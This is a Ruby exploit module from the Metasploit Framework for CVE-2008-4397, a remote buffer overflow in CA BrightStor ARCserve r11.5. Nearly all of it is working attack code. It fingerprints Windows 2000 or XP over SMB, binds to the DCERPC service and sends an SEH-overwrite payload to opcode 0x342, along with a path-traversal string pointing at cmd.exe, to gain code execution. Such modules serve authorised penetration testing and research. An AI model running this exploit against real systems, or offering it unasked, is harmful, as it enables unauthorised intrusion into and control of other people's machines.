##
# $Id: ca_arcserve_342.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::DCERPC
	include Msf::Exploit::Remote::SMB
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Computer Associates ARCserve REPORTREMOTEEXECUTECML Buffer Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in Computer Associates BrighStor ARCserve r11.5 (build 3884).
				By sending a specially crafted RPC request to opcode 0x342, an attacker could overflow the buffer
				and execute arbitrary code. In order to successfully exploit this vulnerability, you will need
				set the hostname argument (HNAME).
			},
			'Author'         => [ 'Nahuel Cayento Riva', 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'BID', '31684' ],
					[ 'OSVDB', '49468' ],
					[ 'CVE', '2008-4397' ],
					[ 'URL', 'http://crackinglandia.blogspot.com/2009/10/el-colador-de-ca-computer-associates.html' ],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 550,
					'BadChars' => "\x00\x0a\x0d\x5c\x5f\x2f\x2e",
					'PrependEncoder' => "\x81\xc4\xff\xef\xff\xff\x44",
				},
			'Platform' => 'win',
			'Targets'  =>
				[
					[ 'Computer Associates BrighStor ARCserve r11.5 (build 3884)', { 'Ret' => 0x2123bdf4 } ], # ASCORE.dll 11.5.3884.0
				],
			'DisclosureDate' => 'Oct 9 2008',
			'DefaultTarget' => 0))

		register_options(
			[
				OptString.new('HNAME', [ true,  'The NetBios hostname of the target.']),
				Opt::RPORT(6504)
			], self.class)
	end

	def fingerprint

		datastore['RPORT'] = 445
		os = smb_fingerprint()
		return os

	end

	def exploit

		path = fingerprint()

		if ( path['os'] =~ /Windows 2000/ )
			dir = "winnt"
			offset = 442
		elsif (  path['os'] =~ /Windows XP/ )
			dir = "windows"
			offset = 436
		else
			print_error("Target not supported!")
			return
		end

		print_status("Identified OS '#{path['os']}', setting appropiate system path...")

		datastore['RPORT'] = 6504

		connect()

		handle = dcerpc_handle('506b1890-14c8-11d1-bbc3-00805fa6962e', '1.0', 'ncacn_ip_tcp', [datastore['RPORT']])
		print_status("Binding to #{handle} ...")

		dcerpc_bind(handle)
		print_status("Bound to #{handle} ...")

		buffer = rand_text_alpha_upper(offset) + generate_seh_payload(target.ret)

		sploit =  NDR.string("#{datastore['HNAME'].upcase}")
		sploit << NDR.string("..\\..\\..\\..\\..\\..\\..\\..\\..\\#{dir}\\system32\\cmd /c \"""\"""")
		sploit << NDR.string(buffer)
		sploit << NDR.string(rand_text_alpha_upper(20))
		sploit << NDR.long(2)
		sploit << NDR.long(2)
		sploit << NDR.string(rand_text_alpha_upper(20))
		sploit << NDR.long(0)
		sploit << NDR.long(4)

		print_status("Trying target #{target.name}...")

			begin
				dcerpc_call(342, sploit)
				rescue Rex::Proto::DCERPC::Exceptions::NoResponse
			end

		handler
		disconnect
	end
end
